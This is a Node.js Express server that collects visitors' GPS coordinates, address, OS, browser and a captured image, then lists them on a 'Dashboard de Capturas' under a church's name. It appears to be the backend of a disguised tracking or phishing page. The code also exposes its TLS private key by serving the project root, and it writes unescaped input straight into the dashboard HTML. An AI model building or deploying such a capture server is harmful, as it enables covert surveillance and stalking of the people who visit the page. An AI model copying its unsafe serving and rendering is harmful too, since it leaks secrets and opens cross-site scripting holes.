const axios = require('axios');


const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname)); // Serve imagens salvas na raiz
app.use(express.json({ limit: '10mb' }));

let dadosRecebidos = [];
app.post('/dados', async (req, res) => {
  const { latitude, longitude, endereco, imagem, sistema, navegador } = req.body;

  const fileName = `captura_${Date.now()}.png`;
  const base64Data = imagem.replace(/^data:image\/png;base64,/, "");
  fs.writeFileSync(path.join(__dirname, fileName), base64Data, 'base64');

  let operadora = 'Desconhecida';
  try {
    const ipRes = await axios.get('http://ip-api.com/json');
    operadora = ipRes.data.isp || operadora;
  } catch (err) {
    console.error('Erro ao buscar operadora:', err.message);
  }

  const registro = {
    latitude,
    longitude,
    endereco,
    sistema,
    navegador,
    imagem: fileName,
    horario: new Date().toLocaleString(),
    operadora
  };

  dadosRecebidos.push(registro);
  console.log('📥 Novo registro recebido:', registro);

  res.send('Dados recebidos com sucesso!');
});



app.get('/dashboard', (req, res) => {
  const total = dadosRecebidos.length;
  const ultimo = total > 0 ? dadosRecebidos[total - 1] : null;

  let html = `
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <title>Dashboard - Igreja Esperança Viva</title>
      <style>
        body {
          font-family: 'Segoe UI', sans-serif;
          background: #121212;
          margin: 0;
          padding: 30px;
          color: #f0f0f0;
        }
        h1 {
          color: #e0d4f7;
          font-size: 2.5em;
          margin-bottom: 10px;
        }
        .container {
          max-width: 900px;
          margin: auto;
        }
        .stats {
          background: #1e1e1e;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 2px 10px rgba(255,255,255,0.05);
          margin-bottom: 30px;
        }
        .card {
          background: #1e1e1e;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 2px 10px rgba(255,255,255,0.05);
          margin-bottom: 30px;
        }
        .card h2 {
          color: #e0d4f7;
          margin-top: 0;
        }
        .info {
          margin: 10px 0;
        }
        .label {
          font-weight: bold;
          color: #c0aaff;
        }
        img {
          max-width: 100%;
          border-radius: 8px;
          margin-top: 10px;
          box-shadow: 0 0 5px rgba(255,255,255,0.2);
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>📊 Dashboard de Capturas</h1>
        <div class="stats">
          <p><span class="label">Total de acessos:</span> ${total}</p>
          ${ultimo ? `<p><span class="label">Último acesso:</span> ${ultimo.horario}</p>` : ''}
        </div>
  `;

  dadosRecebidos.slice().reverse().forEach((dado, index) => {
    html += `
      <div class="card">
        <h2>📥 Acesso ${index + 1}</h2>
        <div class="info"><span class="label">Horário:</span> ${dado.horario}</div>
        <div class="info"><span class="label">Endereço:</span> ${dado.endereco}</div>
        <div class="info"><span class="label">Latitude / Longitude:</span> ${dado.latitude}, ${dado.longitude}</div>
        <div class="info"><span class="label">Sistema:</span> ${dado.sistema}</div>
        <div class="info"><span class="label">Navegador:</span> ${dado.navegador}</div>
        <div class="info"><span class="label">Operadora:</span> ${dado.operadora}</div>
        <div class="info"><span class="label">Imagem capturada:</span><br><img src="/${dado.imagem}" alt="Captura"></div>
      </div>
    `;
  });

  html += `</div></body></html>`;
  res.send(html);
});





const options = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem')
};

https.createServer(options, app).listen(3000, () => {
  console.log('🔒 Servidor HTTPS rodando na porta 3000');
});
